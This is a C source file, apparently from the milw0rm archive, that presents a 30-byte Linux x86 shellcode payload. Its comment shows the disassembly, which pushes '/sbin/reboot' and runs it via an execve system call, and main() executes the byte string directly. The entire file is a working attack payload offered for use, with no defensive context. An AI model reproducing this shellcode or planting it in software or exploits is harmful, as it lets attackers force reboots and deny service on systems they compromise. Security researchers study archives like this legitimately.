/*  Linux x86 PUSH reboot() - 30 bytes
 *  Jonathan Salwan <js.rac.projet[*AT]gmail.com>
 *  Web: http://racprojet.zapto.org
 *
 * Disassembly of section .text:
 *
 * 08048054 <.text>:
 * 8048054:       31 c0                   xor    %eax,%eax
 * 8048056:       50                      push   %eax
 * 8048057:       68 62 6f 6f 74          push   $0x746f6f62
 * 804805c:       68 6e 2f 72 65          push   $0x65722f6e
 * 8048061:       68 2f 73 62 69          push   $0x6962732f
 * 8048066:       89 e3                   mov    %esp,%ebx
 * 8048068:       50                      push   %eax
 * 8048069:       89 e2                   mov    %esp,%edx
 * 804806b:       53                      push   %ebx
 * 804806c:       89 e1                   mov    %esp,%ecx
 * 804806e:       b0 0b                   mov    $0xb,%al
 * 8048070:       cd 80                   int    $0x80
 *
 */

main()
{
char shellcode[] =
			"\x31\xc0"
			"\x50"
			"\x68\x62\x6f\x6f\x74"
			"\x68\x6e\x2f\x72\x65"
			"\x68\x2f\x73\x62\x69"
			"\x89\xe3"
			"\x50"
			"\x89\xe2"
			"\x53"
			"\x89\xe1"
			"\xb0\x0b"
			"\xcd\x80";

       	printf("Length: %d\n",strlen(shellcode));
	(*(void(*)()) shellcode)();
}

// milw0rm.com [2009-01-16]